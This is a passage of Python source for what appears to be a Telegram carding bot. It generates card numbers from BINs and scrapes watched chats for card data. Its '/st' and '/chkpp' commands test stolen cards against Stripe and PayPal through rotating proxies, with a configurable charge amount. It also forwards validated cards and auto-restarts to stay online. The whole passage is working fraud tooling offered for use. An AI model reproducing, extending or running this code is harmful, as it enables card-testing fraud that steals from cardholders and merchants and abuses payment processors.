                header = f"┏━━━━━━━⍟\n┃ GENERATED {count} CARD{'S' if count>1 else ''} 💳\n┗━━━━━━━━━━━⊛\n[❃] 𝗕𝗿𝗮𝗻𝗱  ➜ {bin_info.get('brand','?')}\n[❃] 𝗧𝘆𝗽𝗲   ➜ {bin_info.get('type','?')}\n[❃] 𝗕𝗮𝗻𝗸   ➜ {bin_info.get('bank','?')}\n[❃] 𝗟𝗲𝘃𝗲𝗹  ➜ {bin_info.get('level','?')}\n[❃] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆➜ {bin_info.get('country','?')}\n[❃] 𝗙𝗶𝗿𝘀𝘁𝟲➜ {bin_prefix}\n\n"
            else:
                header = f"┏━━━━━━━⍟\n┃ GENERATED {count} CARD{'S' if count>1 else ''} 💳\n┗━━━━━━━━━━━⊛\n"
            card_lines = [f"[{i}] `{card}`" for i, card in enumerate(cards, 1)]
            full_msg = header + "\n".join(card_lines)
            if len(full_msg) > 4000:
                await event.reply(header + "\n".join(card_lines[:30]))
                if count > 30:
                    await event.reply("\n".join(card_lines[30:]))
            else:
                await event.reply(full_msg)
        elif cmd == "bin":
            if not args:
                await event.reply("Usage: `/bin 414720`")
                return
            raw_digits = re.findall(r'\d{6,}', args)
            bins = list(dict.fromkeys(d[:6] for d in raw_digits))
            if not bins:
                await event.reply("No valid BINs")
                return
            status_msg = await event.reply(f"🔍 Looking up {len(bins)} BIN(s)...")
            results = await asyncio.gather(*[get_bin_info(b) for b in bins])
            lines = []
            for b, info in zip(bins, results):
                if not info:
                    lines.append(f"`{b}` — ❌ Not found")
                else:
                    flag = {"US":"🇺🇸","GB":"🇬🇧","CA":"🇨🇦","AU":"🇦🇺","DE":"🇩🇪","FR":"🇫🇷"}.get(info.get("country_code",""), "🌐")
                    prepaid = " [PREPAID]" if info.get("prepaid") else ""
                    lines.append(f"`{b}` {flag} {info.get('brand','?')} {info.get('type','?')}{prepaid} — {info.get('bank','Unknown')} | {info.get('country','Unknown')}")
            chunk = []
            for line in lines:
                chunk.append(line)
                if len("\n".join(chunk)) > 3800:
                    await status_msg.edit("\n".join(chunk[:-1]))
                    chunk = [chunk[-1]]
            await status_msg.edit(f"┏━━━━━━━⍟\n┃ BIN LOOKUP 🔍 ({len(bins)} BINs)\n┗━━━━━━━━━━━⊛\n" + "\n".join(chunk))
        elif cmd == "st":
            if not args:
                await event.reply("Usage: `/st CC|MM|YY|CVV`")
                return
            card = args.strip()
            if len(card.split("|")) < 4:
                await event.reply("Format: `CC|MM|YY|CVV`")
                return
            status_msg = await event.reply("🔄 Stripe...")
            result = await asyncio.get_event_loop().run_in_executor(None, stripe_authorize, card)
            parts_result = result.split("|", 1)
            status = parts_result[0]
            message = parts_result[1] if len(parts_result) > 1 else ""
            n = card.split("|")[0]
            bin_info = await get_bin_info(n[:6]) if len(n) >= 6 else None
            msg = f"┏━━━━━━━⍟\n┃ {status}\n┗━━━━━━━━━━━⊛\n[❃] 𝗖𝗮𝗿𝗱    ➜ `{card}`\n[❃] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➜ Stripe\n[❃] 𝗥𝗲𝘀𝗽    ➜ {message}\n"
            if bin_info:
                msg += f"[❃] 𝗕𝗿𝗮𝗻𝗱  ➜ {bin_info.get('brand','?')}\n[❃] 𝗧𝘆𝗽𝗲   ➜ {bin_info.get('type','?')}\n[❃] 𝗕𝗮𝗻𝗸   ➜ {bin_info.get('bank','?')}\n[❃] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆➜ {bin_info.get('country','?')}\n"
            await status_msg.edit(msg)
        elif cmd == "chkpp":
            if not args:
                await event.reply("Usage: `/chkpp CC|MM|YY|CVV`")
                return
            card = args.strip()
            if len(card.split("|")) < 4:
                await event.reply("Format: `CC|MM|YY|CVV`")
                return
            n = card.split("|")[0]
            status_msg = await event.reply("🔄 PayPal...")
            paypal_result = await asyncio.get_event_loop().run_in_executor(None, PayPalCharger(proxy=ProxyManager.get()).charge, card)
            bin_info = await get_bin_info(n[:6]) if len(n) >= 6 else None
            if paypal_result.startswith("CHARGED"): status = "CHARGED 💰"
            elif paypal_result.startswith("APPROVED"): status = "APPROVED 🟢"
            elif paypal_result.startswith("DECLINED"): status = "DECLINED 🔴"
            else: status = "ERROR ⚠️"
            response_text = paypal_result.split("|",1)[-1] if "|" in paypal_result else paypal_result
            msg = f"┏━━━━━━━⍟\n┃ {status}\n┗━━━━━━━━━━━⊛\n[❃] 𝗖𝗮𝗿𝗱    ➜ `{card}`\n[❃] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➜ PayPal\n[❃] 𝗥𝗲𝘀𝗽    ➜ {response_text}\n"
            if bin_info:
                msg += f"[❃] 𝗕𝗿𝗮𝗻𝗱  ➜ {bin_info.get('brand','?')}\n[❃] 𝗧𝘆𝗽𝗲   ➜ {bin_info.get('type','?')}\n[❃] 𝗕𝗮𝗻𝗸   ➜ {bin_info.get('bank','?')}\n[❃] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆➜ {bin_info.get('country','?')}\n"
            await status_msg.edit(msg)
        elif cmd == "drop":
            card_text = args.strip()
            card = extract_card_from_text(card_text)
            if not card:
                await event.reply("Usage: `/drop CC|MM|YY|CVV`")
                return
            await xforce.check_and_forward(*card)
        elif cmd == "status":
            qsize = xforce._drop_queue.qsize() if xforce else 0
            pw = "✅ ready" if PLAYWRIGHT_OK else "❌ disabled"
            msg = f"📊 Status\nPlaywright: {pw}\nQueue depth: {qsize}\nLinks: {len(xforce.processed_links)}\nCards: {len(xforce.processed_cards)}"
            await event.reply(msg)
        elif cmd == "clearchat":
            try: await client.delete_messages(event.chat_id, event.message.id)
            except: pass
            await event.reply("\n" * 50 + "🧹 Chat cleared")
        elif cmd == "addchat":
            if not args:
                await event.reply("Usage: `/addchat <username or invite link>`")
                return
            chat_arg = args.strip()
            if chat_arg in SOURCE_CHATS_RAW:
                await event.reply(f"Already watching `{chat_arg}`")
                return
            entity = await join_and_resolve(chat_arg)
            if entity:
                SOURCE_CHATS_RAW.append(chat_arg)
                _save_watched_chats(SOURCE_CHATS_RAW)
                resolved.append(entity)
                title = getattr(entity, 'title', None) or getattr(entity, 'username', chat_arg)
                client.add_event_handler(handle_messages, events.NewMessage(chats=[entity]))
                await event.reply(f"✅ Added `{chat_arg}` ({title})\nTotal: {len(SOURCE_CHATS_RAW)}")
            else:
                await event.reply(f"❌ Could not resolve `{chat_arg}`")
        elif cmd == "removechat":
            if not args:
                await event.reply("Usage: `/removechat <username or invite link>`")
                return
            chat_arg = args.strip()
            if chat_arg not in SOURCE_CHATS_RAW:
                await event.reply(f"Not watching `{chat_arg}`")
                return
            SOURCE_CHATS_RAW.remove(chat_arg)
            _save_watched_chats(SOURCE_CHATS_RAW)
            await event.reply(f"✅ Removed `{chat_arg}`\nTotal: {len(SOURCE_CHATS_RAW)}")
        elif cmd == "setcharge":
            global CHARGE_AMOUNT
            if not args:
                await event.reply(f"Current charge: **${CHARGE_AMOUNT:.2f}**\nUsage: `/setcharge <amount>` (e.g. `/setcharge 2.50`)")
                return
            try:
                new_amount = round(float(args.strip()), 2)
                if new_amount <= 0:
                    await event.reply("❌ Amount must be greater than 0")
                    return
                CHARGE_AMOUNT = new_amount
                await event.reply(f"✅ PayPal charge amount set to **${CHARGE_AMOUNT:.2f}**")
            except ValueError:
                await event.reply("❌ Invalid amount. Example: `/setcharge 1.00`")

    client.add_event_handler(handle_commands, events.NewMessage(outgoing=True, pattern=r'^/(help|gen|bin|st|chkpp|clearchat|drop|status|addchat|removechat|setcharge)\b'))
    print(f"[✅] Listening for new messages in {len(resolved)} chat(s)...", flush=True)
    await client.run_until_disconnected()

async def _notify(msg: str):
    try:
        if client.is_connected():
            await client.send_message(FORWARD_TARGET, msg)
    except:
        pass

RESTART_INTERVAL = 300

async def watchdog():
    if RUN_MODE in ("both", "scraper"):
        first_run = True
        backoff = 15
        while True:
            try:
                if not first_run:
                    try:
                        if client.is_connected():
                            await client.disconnect()
                    except:
                        pass
                    await asyncio.sleep(2)
                    ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
                    print(f"[WATCHDOG] Reconnecting at {ts}...", flush=True)
                    try:
                        await _notify(f"🔄 *Bot Restarted*\n⏰ {ts}\n✅ Back online.")
                    except:
                        pass
                first_run = False
                backoff = 15
                await asyncio.wait_for(run_scraper(), timeout=RESTART_INTERVAL)
            except asyncio.TimeoutError:
                ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
                print(f"[WATCHDOG] 60s cycle complete — restarting at {ts}", flush=True)
            except Exception as e:
                ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
                err_str = str(e)[:300]
                logger.error(f"Scraper crashed: {e}")
                print(f"[WATCHDOG] Crashed: {e} — retry in {backoff}s", flush=True)
                try:
                    await _notify(f"🚨 *Bot Crashed*\n⏰ {ts}\n❌ Error: `{err_str}`\n♻️ Restarting in {backoff}s...")
                except:
                    pass
                await asyncio.sleep(backoff)
                backoff = min(backoff * 2, 300)

if __name__ == "__main__":
    if RUN_MODE == "web":
        run_flask()
    else:
        if RUN_MODE in ("both", "web"):
            _ft = Thread(target=run_flask, daemon=True)
            _ft.start()
            print(f"[🌐] Flask server on port {PORT}", flush=True)
        result = setup_playwright()
        if result:
            print("[OK] Playwright ready – xForce drops enabled", flush=True)
        else:
            print("[WARN] Playwright not available. xForce drops disabled.", flush=True)
        outer_backoff = 15
        while True:
            try:
                asyncio.run(watchdog())
            except KeyboardInterrupt:
                print("[MAIN] Stopped by user.", flush=True)
                break
            except Exception as e:
                print(f"[MAIN] Event loop crashed: {e} — restarting in {outer_backoff}s...", flush=True)
                time.sleep(outer_backoff)
                outer_backoff = min(outer_backoff * 2, 300)